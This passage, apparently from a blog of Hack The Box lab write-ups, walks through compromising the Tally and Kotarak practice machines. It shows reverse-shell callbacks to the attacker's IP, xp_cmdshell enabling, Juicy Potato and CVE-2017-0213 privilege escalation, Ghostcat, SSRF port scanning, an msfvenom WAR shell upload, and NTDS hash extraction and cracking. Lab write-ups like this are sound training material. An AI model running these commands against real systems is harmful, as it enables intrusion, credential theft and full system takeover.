<p><img src="/assets/Tally/spray-and-finance-share-access.jpg" alt="" /></p>

<p>The creds for the <code class="language-plaintext highlighter-rouge">finance</code> user worked and we <strong>got access to the ACCT share.</strong></p>

<p><img src="/assets/Tally/finance-share-access.jpg" alt="" /></p>

<h2 id="going-through-smb">Going through SMB</h2>
<p>We <strong>mounted the share</strong> and started looking at the contents.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount <span class="nt">-t</span> cifs <span class="nt">-o</span> <span class="s1">'username=Finance,password=Acc0unting'</span> //tally/ACCT finance-smb/
</code></pre></div></div>

<p><img src="/assets/Tally/mounting-the-smb-share.jpg" alt="" /></p>

<p>A <strong>custom binary</strong> called <code class="language-plaintext highlighter-rouge">tester.exe</code> was in <code class="language-plaintext highlighter-rouge">/zz_Migration/Binaries/New folder</code></p>

<p><img src="/assets/Tally/tester-exe-found.jpg" alt="" /></p>

<p><em>when running</em> <code class="language-plaintext highlighter-rouge">strings</code> <em>against it,</em> we found <strong>creds</strong> inside:</p>

<p><img src="/assets/Tally/db-password-found.jpg" alt="" /></p>

<h2 id="getting-a-shell-through-mssql">Getting a shell through MSSQL</h2>
<p>The creds worked when we <strong>connected to MSSQL</strong> on port 1433 using the <code class="language-plaintext highlighter-rouge">sqsh</code> tool.</p>

<p><em>However, to execute commands on the system,</em> we needed to <strong>enable</strong> the <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> feature which was <strong>initially unavailable</strong>.</p>

<p><em>At first,</em> it was set as an “<code class="language-plaintext highlighter-rouge">advanced option</code>”.</p>

<p>so we <strong>reconfigured the shell</strong> to “<code class="language-plaintext highlighter-rouge">show advanced options</code>” and could then <strong>re-enable</strong> <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> using the commands below:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">'show advanced options'</span><span class="p">,</span> <span class="s1">'1'</span>
<span class="n">reconfigure</span>
<span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">'xp_cmdshell'</span><span class="p">,</span> <span class="s1">'1'</span>
<span class="n">reconfigure</span>
<span class="n">xp_cmdshell</span> <span class="s1">'whoami'</span>
</code></pre></div></div>

<p>here’s how it looked <em>(notice the error messages and results after running the commands)</em>:</p>

<p><img src="/assets/Tally/enabling-xp-cmd-shell-mssql.jpg" alt="" /></p>

<p><em>After running the</em> <code class="language-plaintext highlighter-rouge">whoami</code> <em>command</em>, we find ourselves executing code as the <code class="language-plaintext highlighter-rouge">sarah</code> user.</p>

<p><strong>Note:</strong> <em>because, over time,</em> <em>the</em> <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> <em>option kept getting</em> <strong><em>automatically disabled</em></strong>, we put the <strong>MSSQL commands in a file</strong> for a <strong>bit of automation.</strong></p>

<p>We added the code to both <strong>re-enable it</strong> and issue a <strong>PowerShell web request</strong> to <strong>execute</strong> a <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Nishang Reverse Shell</a> hosted on our web server to streamline the process in case we lost our shell.</p>

<p><img src="/assets/Tally/shell-as-sarah.jpg" alt="" /></p>

<p>We now had a <strong>proper shell</strong> as <code class="language-plaintext highlighter-rouge">sarah</code></p>

<h2 id="privesc-path-1-abusing-the-seimpersonateprivilege">Privesc Path #1: Abusing the SeImpersonatePrivilege</h2>

<p><em>Since we got in through</em> <strong><em>MSSQL,</em></strong> we had the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> enabled.</p>

<p><img src="/assets/Tally/se-impersonate-enabled.jpg" alt="" /></p>

<p>That privilege is <strong>ripe for exploitation</strong> using <strong>Juicy Potato</strong>.</p>

<p><em>To abuse it,</em> we <strong>downloaded the binary</strong> from <a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">Github</a> and renamed it to <code class="language-plaintext highlighter-rouge">jp.exe</code></p>

<p><em>From our experience,</em> that exploit <strong>always worked</strong> when used with a <strong>single executable</strong> rather than <strong>passing arguments</strong>.</p>

<p><em>for that,</em> our choice is going to be a <a href="https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc">C# reverse shell</a></p>

<p>Why? because that shell is <strong>good for bypassing Windows Defender</strong></p>

<p>We know <strong>defender was enabled</strong> from the <strong>hint</strong> in the <code class="language-plaintext highlighter-rouge">todo.txt</code> file on <code class="language-plaintext highlighter-rouge">sarah</code>’s desktop:</p>

<p><img src="/assets/Tally/windows-defender-hint.jpg" alt="" /></p>

<p>we can <strong>confirm</strong> that with the <strong>PowerShell cmdlet</strong> <code class="language-plaintext highlighter-rouge">Get-MpComputerStatus</code></p>

<p><img src="/assets/Tally/real-time-protection-enabled.jpg" alt="" /></p>

<p>We <strong>modify the shell</strong> with our <strong>IP and port</strong></p>
<pre><code class="language-C#">// SNIP //
TcpClient client = new TcpClient("10.10.16.4", 9001)
// SNIP //
</code></pre>

<p>And then <strong>compile the code (rev.cs)</strong> on the victim machine using the <strong>native .NET compiler</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:rev.exe C:\Users\sarah\rev.cs
</code></pre></div></div>

<p><strong>Note:</strong> the <strong>compilation errors</strong> weren’t serious here and we got back the exe file.</p>

<p><img src="/assets/Tally/compilin-csharp-rev.jpg" alt="" /></p>

<p><em>after running</em> <strong>Juicy Potato</strong> <em>with our</em> <code class="language-plaintext highlighter-rouge">rev.exe</code> <em>as an argument,</em> it connected back to us as <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jp.exe -l 1337 -p c:\users\sarah\rev.exe -t *
</code></pre></div></div>

<p><img src="/assets/Tally/juicy-potato-to-system-rev-shell.jpg" alt="" /></p>

<h2 id="privesc-path-2-modifying-the-scheduled-powershell-script">Privesc Path #2: Modifying the Scheduled PowerShell Script</h2>
<p><em>Also on</em> <code class="language-plaintext highlighter-rouge">sarah</code><em>’s desktop,</em> there was a <strong>Powershell script</strong> called <code class="language-plaintext highlighter-rouge">SPBestWarmup.ps1</code> and <strong>another XML file</strong> with the same name <code class="language-plaintext highlighter-rouge">SPBestWarmup.xml</code></p>

<p><img src="/assets/Tally/spwarmup-scripts.jpg" alt="" /></p>

<p><em>when looking at the XML file,</em> we notice something:</p>

<p><img src="/assets/Tally/spwarmup-xml-contents.jpg" alt="" /></p>

<p><strong>these options</strong> indicate that <strong>this script is part of a scheduled task.</strong></p>

<p><em>To exploit this,</em> we need to <strong>check for write permissions</strong> on it. So we ran a quick <code class="language-plaintext highlighter-rouge">Get-ACL</code> <strong>PowerShell command</strong>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ACL</span><span class="w"> </span><span class="o">.</span><span class="nx">\SPBestWarmup.ps1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-Expand</span><span class="w"> </span><span class="nx">AccessToString</span><span class="w">
</span></code></pre></div></div>

<p><img src="/assets/Tally/write-access-to-script.jpg" alt="" /></p>

<p><strong>We have full control!</strong></p>

<p>We went ahead and <strong>added a reverse shell</strong> to that script right away.</p>

<p><em>However, because it was configured to run</em> <strong><em>every hour,</em></strong> we had to wait for it…</p>

<p>But we eventually <strong>received a shell</strong> as <code class="language-plaintext highlighter-rouge">Administrator</code></p>

<p><img src="/assets/Tally/shell-as-administrator.jpg" alt="" /></p>

<h2 id="privesc-path-3-cve-2017-0213">Privesc Path #3: CVE-2017-0213</h2>
<p><em>After taking over the machine using the above two ways, and while looking at the</em> <a href="https://app.hackthebox.com/machines/Tally/walkthroughs">Official Writeup</a>, I found that <strong><em>exploiting CVE-2017-0213</em></strong> was <strong><em>the intended path.</em></strong></p>

<p>The <a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213.cpp">source code</a> for it was <strong>to be compiled in Visual Studio.</strong></p>

<p><em>when building the binary without any modifications,</em> we get a <strong>type error</strong>.</p>

<p><img src="/assets/Tally/eop-cve-compile-error.jpg" alt="" /></p>

<p><em>On Google,</em> we queried with <strong>both the error as well as the variable name</strong> to get the <strong>most relevant results</strong></p>

<p><img src="/assets/Tally/google-stackoverflow.jpg" alt="" /></p>

<p>The <strong>first result</strong> happened to be <strong>for the exact exploit</strong>. Here was <strong>the solution:</strong></p>

<p><img src="/assets/Tally/exploit-error-fix.jpg" alt="" /></p>

<p><em>After applying the fix,</em> we edited the <code class="language-plaintext highlighter-rouge">cmdline</code> variable and <strong>inserted our shell’s path</strong> instead.</p>

<p>That’s because the <strong>default exploit code ran</strong>  <code class="language-plaintext highlighter-rouge">cmd.exe</code> which is <strong>just a Proof of Concept.</strong></p>

<p>We make sure to <strong>select the x86 process architecture</strong> (<em>the 64-bit version didn’t work</em>)</p>

<p><img src="/assets/Tally/cpp-build-succeeded.jpg" alt="" /></p>

<p>Running the exploit <strong>from a normal shell</strong> wouldn’t do the trick.</p>

<p>That’s because <strong>it requires an interactive process</strong> <em>to do its magic.</em></p>

<p><em>To achieve that,</em> we must get a <strong>Meterpreter shell.</strong></p>

<p>We will first <strong>start a Metasploit handler</strong> on our Kali box.</p>

<p><em>And, on Tally,</em> we will use <strong>PowerShell</strong>’s <code class="language-plaintext highlighter-rouge">start-process</code> command with the <code class="language-plaintext highlighter-rouge">rev.exe</code> binary to <strong>fork out from our shell</strong> and <strong>connect back to our listener.</strong></p>

<p><em>Once we catch the shell,</em> we can <strong>upgrade it</strong> using the <code class="language-plaintext highlighter-rouge">sessions -u</code> command.</p>

<p><img src="/assets/Tally/upgrade-to-meterpreter.jpg" alt="" /></p>

<p><em>Now,</em> getting into an “interactive process” can be easily achieved by <strong>migrating to a process with session ID = 1</strong></p>

<p>we choose <code class="language-plaintext highlighter-rouge">svchost.exe</code> because it should be a <strong>stable process.</strong></p>

<p><img src="/assets/Tally/migration-done.jpg" alt="" /></p>

<p><em>After migrating,</em> we <strong>drop into a cmd shell</strong> with the <code class="language-plaintext highlighter-rouge">shell</code> command and <strong>launch the exploit</strong> to <strong>get a connection back</strong> as <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>

<p><img src="/assets/Tally/cve-eop-worked.jpg" alt="" /></p>

<p>it was <strong>very difficult to figure out</strong>. But we <strong>ended up learning a new privesc technique :D</strong></p>

<h2 id="chasing-the-firefox-exploit-down-a-rabbit-hole">Chasing the Firefox Exploit down a Rabbit Hole</h2>

<p><em>when we went into the</em> <code class="language-plaintext highlighter-rouge">Intranet</code> <em>folder (mentioned in the note on SharePoint),</em> we found a sub-folder called <code class="language-plaintext highlighter-rouge">binaries</code>.</p>

<p>It contained a <strong>certain version of Firefox.</strong></p>

<p><img src="/assets/Tally/3-exploits-for-vuln-firefox.jpg" alt="" /></p>

<p>When using <code class="language-plaintext highlighter-rouge">searchsploit</code>, we got a <strong>couple of exploits</strong> for it.</p>

<p><img src="/assets/Tally/firefox-searchsploit.jpg" alt="" /></p>

<p>Our <strong>theory</strong> had a few parts:</p>

<ul>
  <li><strong>Finding this installer</strong> meant that <strong>there’s a high chance</strong> it was being <strong>used in the environment.</strong></li>
  <li>And since either <code class="language-plaintext highlighter-rouge">sarah</code> or <code class="language-plaintext highlighter-rouge">tim</code> would be checking an <code class="language-plaintext highlighter-rouge">index.html</code> from <code class="language-plaintext highlighter-rouge">rahul</code>, they would <strong>likely be using that version of Firefox</strong> to do so.</li>
  <li>And that’s where the exploit should come in.</li>
</ul>

<p><em>To confirm our theory,</em> we uploaded an <code class="language-plaintext highlighter-rouge">index.html</code> to the <code class="language-plaintext highlighter-rouge">intranet</code> folder <strong>setting it up to redirect to our Kali.</strong></p>

<p><img src="/assets/Tally/index-html-redirect.jpg" alt="" /></p>

<p>We have to use the <strong>binary mode in FTP</strong> to <strong>avoid any corruption in-transit.</strong></p>

<p><img src="/assets/Tally/ftp-binary-upload.jpg" alt="" /></p>

<p><em>After a couple of minutes,</em> we <strong>got our confirmation</strong> from the <code class="language-plaintext highlighter-rouge">user-agent</code> HTTP header.</p>

<p><img src="/assets/Tally/victim-firefox-version-confirmed.jpg" alt="" /></p>

<p><em>to choose an exploit,</em> we first <strong>checked the Metasploit module</strong> because the framework’s exploits are <strong>usually well-developed</strong>.</p>

<p><em>Sadly,</em> it <strong>did’t match our target’s version.</strong></p>

<p><img src="/assets/Tally/MSF-firefox-exploit-no-match.jpg" alt="" /></p>

<p>We then turned to the one with the <strong>exact version match</strong> <a href="https://www.exploit-db.com/exploits/44294">here</a>.</p>

<p><img src="/assets/Tally/edb-firefox-exploit-verified.jpg" alt="" /></p>

<p>it was <strong>verified on EDB.</strong> and <strong>it did work well in testing</strong>. <strong><em>But only with</em></strong> the <code class="language-plaintext highlighter-rouge">calc.exe</code> <strong>payload :/</strong></p>

<p><img src="/assets/Tally/calc-works-ff-exploit.jpg" alt="" /></p>

<p><em>no matter how many shellcodes we generated using</em> <code class="language-plaintext highlighter-rouge">sc2asmjs.py</code>. None worked :X</p>

<p><img src="/assets/Tally/ff-exploit-instructions.jpg" alt="" /></p>

<p>this <a href="https://www.exploit-db.com/exploits/42484">version</a> on <strong>Exploit-DB</strong> did work. <strong><em>But after payload modification and many many tries…</em></strong></p>

<p><em>If you’re interested in checking it out.</em> you can view it on the <a href="https://app.hackthebox.com/machines/Tally/walkthroughs">Official Writeup</a></p>

<p><strong>Tough machine, huh?</strong></p>

<p><strong>Hope you enjoyed :)</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Hard] - Kotarak</title><link href="http://localhost:4000/2022/08/26/Kotarak.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Hard] - Kotarak" /><published>2022-08-26T00:00:00+02:00</published><updated>2022-08-26T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/26/Kotarak</id><content type="html" xml:base="http://localhost:4000/2022/08/26/Kotarak.html"><![CDATA[<p><img src="/assets/Kotarak/Kotarak.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li><strong>Kotarak</strong> is a really fun box. it had <strong>SSH</strong>, an <strong>Apache web server</strong> and <strong>Tomcat</strong> listening on the outside.</li>
  <li><em>Even though the Tomcat was vulnerable to</em> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938">Ghostcat</a>, that path didn’t take us anywhere.</li>
  <li><em>Instead,</em> the <strong>web page</strong> on the <strong>Apache</strong> had a <strong>Server-Side Request Forgery</strong> which we could exploit to get further.</li>
  <li>We used the <strong>SSRF</strong> and <code class="language-plaintext highlighter-rouge">wfuzz</code> to <strong>enumerate the open internal ports</strong> and found a <strong>web page which had a backup</strong> of the <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code> file.</li>
  <li>That file <strong>contained credentials</strong> that we used to <strong>upload a WAR reverse shell</strong> and get on the box.</li>
  <li><em>On the file system,</em> we found an <strong>Active Directory</strong> <code class="language-plaintext highlighter-rouge">ntds.dit</code> <strong>dump</strong> which was apparently a remnant of a pentest.</li>
  <li>We <strong>extracted all the domain hashes</strong> from that and cracked one of them for a password which belonged to the <code class="language-plaintext highlighter-rouge">atanas</code> local user.</li>
  <li><em>As</em> <code class="language-plaintext highlighter-rouge">atanas</code>, we came to <strong>find a file owned by us</strong> called <code class="language-plaintext highlighter-rouge">app.log</code> <strong><em>within the root folder.</em></strong></li>
  <li>It contained past events of <strong>another host using a vulnerable version</strong> of <code class="language-plaintext highlighter-rouge">wget</code> to fetch data from ours.</li>
  <li><em>After finding a tool called</em> <code class="language-plaintext highlighter-rouge">authbind</code> <em>installed on the system</em> (<em>it lets you use low ports without being root</em>) we use it to <strong>deploy a python web server</strong> and verify that <strong><em>there were indeed requests still being made to our machine.</em></strong></li>
  <li>We set up <strong>an elaborate exploit</strong> to target the client’s <code class="language-plaintext highlighter-rouge">wget</code> enabling us to <strong>plant a cron job</strong> to <strong>run as root</strong> and <strong>give us a shell on his box.</strong></li>
</ul>

<hr />

<h2 id="nmap">NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title:         Kotarak Web Hosting        
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<p>The <strong>full range port scan</strong> gets us that <strong>Apache on port 60000</strong> as well as the <strong>two Tomcat ports</strong> 8009 and 8080 plus <strong>SSH</strong>.</p>

<p>The <code class="language-plaintext highlighter-rouge">http-title</code> nmap script gives us a hint that there’s <strong>custom content</strong> there (<strong>Kotarak Web Hosting</strong>)</p>

<h2 id="quickly-testing-tomcat">Quickly Testing Tomcat</h2>
<p>We will go over some <strong>fast checks</strong> here first looking for <strong>easy wins</strong>.</p>

<p><em>when visiting port 8080,</em> we found <strong>an error message</strong> there <strong>instead of the standard home page.</strong></p>

<p><img src="/assets/Kotarak/tomcat-home-page-error.jpg" alt="" /></p>

<p>We first want to <strong>test for default credentials</strong> in the <strong>Tomcat manager interface</strong>. So we check for it in <strong>the standard location</strong> at <code class="language-plaintext highlighter-rouge">/manager/html</code></p>

<p><img src="/assets/Kotarak/tomcat-manager-login.jpg" alt="" /></p>

<p>It’s there. that <strong>pop-up</strong> indicates <strong>HTTP basic authentication</strong>. we can use <code class="language-plaintext highlighter-rouge">hydra</code> to <strong>brute-force</strong> that.</p>

<p>we’re going to use <strong>Metasploit’s default user/password list:</strong></p>

<p><img src="/assets/Kotarak/getting-the-msf-list.jpg" alt="" /></p>

<p>but we need to <strong>change up the list</strong> to match the format that <code class="language-plaintext highlighter-rouge">hydra</code>’s <code class="language-plaintext highlighter-rouge">-C</code> flag will accept: <code class="language-plaintext highlighter-rouge">login:pass</code></p>

<p><img src="/assets/Kotarak/the-list-and-hydra-usage.jpg" alt="" /></p>

<p>a quick <code class="language-plaintext highlighter-rouge">sed</code> <strong>replacing all spaces with colons</strong> (<code class="language-plaintext highlighter-rouge">:</code>) takes care of that and we <strong>save the list to a file</strong> before launcing the attack</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-C</span> tomcat_user_pass_list.txt <span class="nt">-s</span> 8080 <span class="nt">-f</span> kotarak http-get /manager/html <span class="nt">-vV</span>
</code></pre></div></div>

<p><img src="/assets/Kotarak/hydra-attack.jpg" alt="" /></p>

<p>no luck though :/</p>

<p><em>Next,</em> we <strong>check for exploits</strong> using <code class="language-plaintext highlighter-rouge">searchsploit</code> (our version is 8.5.5)</p>

<p><img src="/assets/Kotarak/searchsploit-tomcat-8.jpg" alt="" /></p>

<p>The only match was “Apache Tomcat 6/7/8/9 Information Disclosure” <a href="https://nvd.nist.gov/vuln/detail/CVE-2016-6816">CVE-2016-6816</a>. but it didn’t seem of good use to us.</p>

<p><em>however,</em> we ought to check if the famous <strong>Ghostcat vulnerability</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1938">CVE-2020-1938</a> was there.</p>

<p><img src="/assets/Kotarak/ghostcat-nvd.jpg" alt="" /></p>

<p><strong>our version should be vulnerable.</strong> Let’s use this <a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">Github exploit</a> for testing:</p>

<p><img src="/assets/Kotarak/ajpshooter-usage.jpg" alt="" /></p>

<p>the usage seems pretty straighforward.</p>

<p><em>from</em> <code class="language-plaintext highlighter-rouge">nmap</code><em>’s output,</em> the <code class="language-plaintext highlighter-rouge">ajp_port</code> port is <code class="language-plaintext highlighter-rouge">8009</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python ajpShooter.py http://kotarak:8080 8009 /WEB-INF/web.xml <span class="nb">read</span>
</code></pre></div></div>

<p><img src="/assets/Kotarak/ajpshooter-works.jpg" alt="" /></p>

<p>We were <strong>able to read</strong> the <code class="language-plaintext highlighter-rouge">/WEB-INF/web.xml</code> file but <strong>there wasn’t anything useful in it</strong>. So we move on..</p>

<h2 id="the-apache-high-port">The Apache High Port</h2>
<p><em>On port 60000,</em> we find this page:</p>

<p><img src="/assets/Kotarak/port-60k.jpg" alt="" /></p>

<p>none of the links on the left side work. But our senses are telling us that we <strong>should check for SSRF here.</strong></p>

<p>That’s because the page talks <strong>about browsing</strong>. <em>And, in the source code,</em> the form’s <strong>action for submission</strong> is the <code class="language-plaintext highlighter-rouge">url.php</code> file.</p>

<p>we have to <strong>test a URL here as input.</strong></p>

<p><img src="/assets/Kotarak/possible-ssrf-detection.jpg" alt="" /></p>

<p>we’ll first test if it can connect back to us.</p>

<p>So we stand up a <strong>quick PHP web server</strong> with <code class="language-plaintext highlighter-rouge">php -S 0.0.0.0:80</code> and supply the URL for our kali:</p>

<p><strong>Note:</strong> a normal python web server or netcat would still be OK. <em>I just felt like using PHP at the time XD</em></p>

<p><img src="/assets/Kotarak/ssrf-confirmed.jpg" alt="" /></p>

<p>we got a request back!</p>

<h2 id="exploiting-ssrf">Exploiting SSRF</h2>
<p>We’re going to use <code class="language-plaintext highlighter-rouge">wfuzz</code> to see <strong>what’s listening on the box locally.</strong></p>

<p>we first do a <strong>quick fuzz</strong> over ports 8080 to 8090 to <strong>see the reponses for open ports (like 8080) vs. closed ports (8081-8090)</strong> and be able to <strong>tune out the closed ones.</strong></p>

<p><strong><em>a.k.a calibrate our toolz :D</em></strong></p>

<p><img src="/assets/Kotarak/wfuzz-test-run.jpg" alt="" /></p>

<p><em>alright, from the response size,</em> we <strong>detect port 8080</strong> which <strong>we knew was up serving the tomcat</strong></p>

<p>we can deduce that <strong>there’s nothing listening on the other ports</strong> from the small responses (2 characters).</p>

<p>we will use the <code class="language-plaintext highlighter-rouge">--hh</code> flag to <strong>exclude those responses</strong> and <strong>provide the full range of TCP ports</strong> (1-65535) for fuzzing.</p>

<p>Setting the <code class="language-plaintext highlighter-rouge">-t</code> flag to <strong>50 concurrent connections</strong> is good <strong><em>for speed</em></strong> since <strong>we’re going to do 65K+ requests</strong> and <em>we haven’t got all day :D</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-t</span> 50 <span class="nt">--hh</span> 2 <span class="nt">-z</span> range,1-65535 <span class="nt">-c</span> http://kotarak:60000/url.php?path<span class="o">=</span>http://127.0.0.1:FUZZ
</code></pre></div></div>

<p><img src="/assets/Kotarak/ssrf-portscan-results.jpg" alt="" /></p>

<p>a <strong>lot of ports</strong> come up:</p>
<ul>
  <li>22 (SSH)</li>
  <li>90</li>
  <li>110</li>
  <li>200</li>
  <li>320</li>
  <li>888</li>
  <li>3306 (mysql most likely)</li>
  <li>8080 (tomcat)</li>
  <li>and 60000 (the browser page)</li>
</ul>

<p><em>checking the unknown ports…</em></p>

<p><strong>Port 90:</strong> junk</p>

<p><img src="/assets/Kotarak/ssrf-port-90.jpg" alt="" /></p>

<p><strong>Port 110:</strong> junk too</p>

<p><img src="/assets/Kotarak/ssrf-port-110.jpg" alt="" /></p>

<p><strong>Port 200:</strong> third is a charm right? nope. junk also :P</p>

<p><img src="/assets/Kotarak/ssrf-port-200.jpg" alt="" /></p>

<p><strong>Port 320:</strong> a login form! but, the <strong><em>action field within the form is empty.</em></strong> junk for the 4th time :/</p>

<p><img src="/assets/Kotarak/ssrf-port-320.jpg" alt="" /></p>

<p><strong>Port 888:</strong> at last something interesting here xD</p>

<p><img src="/assets/Kotarak/ssrf-port-888.jpg" alt="" /></p>

<p><em>to get the file,</em> we add <code class="language-plaintext highlighter-rouge">?doc=backup</code> to the base url and use <code class="language-plaintext highlighter-rouge">curl</code> <em>instead of clicking the link.</em></p>

<p><img src="/assets/Kotarak/cred-found-on-888.jpg" alt="" /></p>

<p>it turns out to be the <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code> file. <strong>we got creds!</strong></p>

<h2 id="war-shell-upload">WAR Shell Upload</h2>
<p><em>Before getting too excited,</em> we first <strong>verify the logins</strong> with <code class="language-plaintext highlighter-rouge">hydra</code></p>

<p><img src="/assets/Kotarak/hydra-verify-tomcat.jpg" alt="" /></p>

<p>Green! we’re good to go</p>

<p><strong><em>To get remote code exectuion,</em></strong> we will need to <strong>generate a WAR reverse shell</strong> with <code class="language-plaintext highlighter-rouge">msfvenom</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.16.5 <span class="nv">lport</span><span class="o">=</span>9000 <span class="nt">-f</span> war <span class="nt">-o</span> letmein.war
</code></pre></div></div>

<p>and <strong>upload it</strong> with <code class="language-plaintext highlighter-rouge">curl</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> <span class="nt">-u</span> admin:<span class="s1">'3@g01PdhB!'</span> <span class="nt">--upload-file</span> letmein.war <span class="s2">"http://kotarak:8080/manager/text/deploy?path=/shell&amp;update=true"</span>
</code></pre></div></div>

<p>then do another <code class="language-plaintext highlighter-rouge">curl</code> to <strong>hit the endpoint</strong> and <strong>trigger our shell</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://kotarak:8080/shell
</code></pre></div></div>

<p>It should look like this:</p>

<p><img src="/assets/Kotarak/shell-as-tomcat.jpg" alt="" /></p>

<p><strong>We’re in. Sweet :]</strong></p>

<h2 id="lateral-movement">Lateral Movement</h2>
<p><em>after getting our reverse shell,</em> we <strong>improve it</strong> like the usual:</p>

<p><img src="/assets/Kotarak/shell-improvement.jpg" alt="" /></p>

<p>and we <code class="language-plaintext highlighter-rouge">source</code> the <code class="language-plaintext highlighter-rouge">.bashrc</code> file from the <code class="language-plaintext highlighter-rouge">atanas</code> user for a colored output.</p>

<p><img src="/assets/Kotarak/getting-colors-in-our-session.jpg" alt="" /></p>

<p><em>when going through the file system,</em> we find <strong>something very interesting:</strong></p>

<p><img src="/assets/Kotarak/finding-ntds-dump.jpg" alt="" /></p>

<p>the <strong>keywords</strong> here are:</p>
<ul>
  <li>the <strong>1st file’s name:</strong> <strong>NTDS</strong> (this is the name of the <strong>Active Directory database file</strong> <code class="language-plaintext highlighter-rouge">ntds.dit</code>)</li>
  <li>the <strong>2nd file’s type:</strong> <strong>MS Windows Registry</strong> file (<em>probably the</em> <strong><em>system hive</em></strong> <em>containing the</em> <strong><em>boot key</em></strong> <em>needed to</em> <strong><em>extract hashes</em></strong>)</li>
</ul>

<p><strong>these two components are enough for us to get all the domain hashes within.</strong></p>

<p><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> script can easily take care of this.</p>

<p>we’re first going to <strong>transfer those files over</strong> to kali to <strong>dump those hashes and try to crack them</strong></p>

<p><img src="/assets/Kotarak/transfer-ad-dump.jpg" alt="" /></p>

<p><em>after renaming the .dit file to</em> <code class="language-plaintext highlighter-rouge">ntds.dit</code> <em>and the .bin file to</em> <code class="language-plaintext highlighter-rouge">system</code>, we run:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py <span class="nt">-just-dc-ntlm</span> <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> system <span class="nb">local</span>
</code></pre></div></div>

<p><img src="/assets/Kotarak/secrets-dump.jpg" alt="" /></p>

<p>We then pass those to <code class="language-plaintext highlighter-rouge">hashcat</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 1000 hashes.txt /usr/share/wordlists/rockyou.txt
</code></pre></div></div>

<p><img src="/assets/Kotarak/hashcat-cracking.jpg" alt="" /></p>

<p>the hash that cracked belonged to the <code class="language-plaintext highlighter-rouge">administrator</code> user.</p>

<p><img src="/assets/Kotarak/knowing-which-hash-was-cracked.jpg" alt="" /></p>

<p><em>Just to be sure,</em> we’re going to try it with both <code class="language-plaintext highlighter-rouge">root</code> and <code class="language-plaintext highlighter-rouge">atanas</code>. since we didn’t find other users locally with a proper shell.</p>

<p><img src="/assets/Kotarak/finding-local-linux-users.jpg" alt="" /></p>

<p>it failed with <code class="language-plaintext highlighter-rouge">root</code> but worked with <code class="language-plaintext highlighter-rouge">atanas</code></p>

<p><img src="/assets/Kotarak/shell-as-atanas.jpg" alt="" /></p>

<h2 id="unusual-activity">Unusual Activity</h2>
<p><em>Starting on privesc,</em> we ran <a href="https://github.com/carlospolop/PEASS-ng">LinPEAS</a> and <strong>saw something very strange:</strong></p>

<p><img src="/assets/Kotarak/root-files.jpg" alt="" /></p>

